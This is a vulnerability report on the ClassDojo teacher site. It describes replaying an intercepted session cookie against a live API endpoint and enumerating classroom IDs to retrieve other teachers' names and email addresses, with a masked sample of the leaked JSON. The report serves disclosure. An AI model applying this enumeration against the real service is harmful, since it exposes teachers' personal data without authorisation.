# About ClassDojo Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie: dojo_log_session_id=33ecbc0c-4aa9-439c-9f5c-77c1b5846ba2; dojo_pubnub_clientId=dojo-1224561867; dojorrt=1712144706368; dojo_login.sid=s%3AquM_IFfzHAaMateL3kMz4CVz8cZo4L34.Ww%2FYXeopBBc3m%2FPsTtNJMx7MEhBBGsrt4w3sryGiRa0; dojo_teach_login.sid=s:quM_IFfzHAaMateL3kMz4CVz8cZo4L34.Ww/YXeopBBc3m/PsTtNJMx7MEhBBGsrt4w3sryGiRa0
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: Other teachers'information in the same online classroom.

> Request method: GET, information can be obtained by traversing the constructed classroom id,such as "65b776c41713fb420257f7d9","660d3fd0779b4c535eaddfc2
"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params |
|---------|---|-----------|
|Liu jias|https://teach.classdojo.com/api/dojoClass/65b776c41713fb420257f7d9?withRequestedCollaborators=true|_id=65b776c41713fb420257f7d9|



### Leaked packet cases 
``` 
"collaborators": [
        {
            "_id": "*******914ed7103db4af1468",
            "emailAddress": "example@email.com",
            "title": "先生",
            "firstName": "*******",
            "lastName": "***",
            "sharingStatus": "owner",
            "_links": {
                "photo": {
                    "href": "https://pstatic.classdojo.com/img/dojo_bootstrap/teacher-avatars/big/5.png"
                }
            }
        },
        {
            "_id": "*******da9fa282b5fde24fb",
            "emailAddress": " example@email.com ",
            "title": "先生",
            "firstName": "*****",
            "lastName": "****",
            "sharingStatus": "accepted",
            "isMe": true,
            "_links": {
                "photo": {
                    "href": "https://pstatic.classdojo.com/img/dojo_bootstrap/teacher-avatars/big/5.png"
                }
            }
        }
    ],
```